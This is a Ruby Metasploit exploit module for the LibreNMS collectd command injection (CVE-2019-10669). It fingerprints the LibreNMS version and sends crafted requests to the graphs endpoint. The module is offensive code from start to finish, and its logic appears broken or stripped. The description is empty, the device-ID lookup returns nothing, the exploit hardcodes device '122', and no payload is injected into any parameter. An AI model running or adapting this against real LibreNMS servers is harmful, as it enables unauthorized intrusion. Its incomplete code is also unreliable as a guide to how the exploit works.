##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'LibreNMS Collectd Command Injection',
      'Description'    => %q(
      ),
      'License'        => MSF_LICENSE,
      'Author'         =>
      [
        'Eldar Marcussen', # Vulnerability discovery
        'Shelby Pace'      # Metasploit module
      ],
      'References'     =>
        [
          [ 'CVE', '2019-10669' ],
          [ 'URL', 'https://www.darkmatter.ae/xen1thlabs/librenms-command-injection-vulnerability-xl-19-017/' ]
        ],
      'Payload'        => { },
      'Targets'        => [ [ 'Linux', { } ] ],
      'DisclosureDate' => "2019-07-15",
      'DefaultTarget'  => 0
    ))

    register_options(
    [
      OptString.new('TARGETURI', [ true, 'Base LibreNMS path', '/' ])
    ])
  end

  def check
    res = send_request_cgi!('method'  =>  'GET', 'uri'  =>  target_uri.path)
    return Exploit::CheckCode::Safe unless res && res.body.downcase.include?('librenms')

    about_res = send_request_cgi(
      'method'  =>  'GET',
      'uri'     =>  normalize_uri(target_uri.path, 'pages', 'about.inc.php')
    )

    return Exploit::CheckCode::Detected unless about_res && about_res.code == 200

    version = about_res.body.match(/version\s+to\s+(\d+\.\d+\.?\d*)/)
    return Exploit::CheckCode::Detected unless version && version.length > 1
    vprint_status("LibreNMS version #{version[1]} detected")
    version = Gem::Version.new(version[1])

    return Exploit::CheckCode::Appears if version <= Gem::Version.new('1.50')
  end

  def get_device_id
    dev_uri = normalize_uri(target_uri.path, 'devices')

    dev_res = send_request_cgi('method' =>  'GET', 'uri'  =>  dev_uri)
    fail_with(Failure::NotFound, 'Failed to access the devices page') unless dev_res && dev_res.code == 200
  end

  def exploit
    req_uri = normalize_uri(target_uri.path, 'graphs', '/')

    dev_id = get_device_id
    send_request_cgi(
      'method'    =>  'GET',
      'uri'       =>  req_uri,
      'vars_get'  =>
      {
        'device'          =>  '122',
        'type'            =>  'device_collectd',
        'to'              =>  'blah',
        'from'            =>  'blah',
        'c_plugin'        =>  'test',
        'c_type'          =>  'cpu',
        'c_type_instance' =>  'collectd'
      }
    )
  end
end
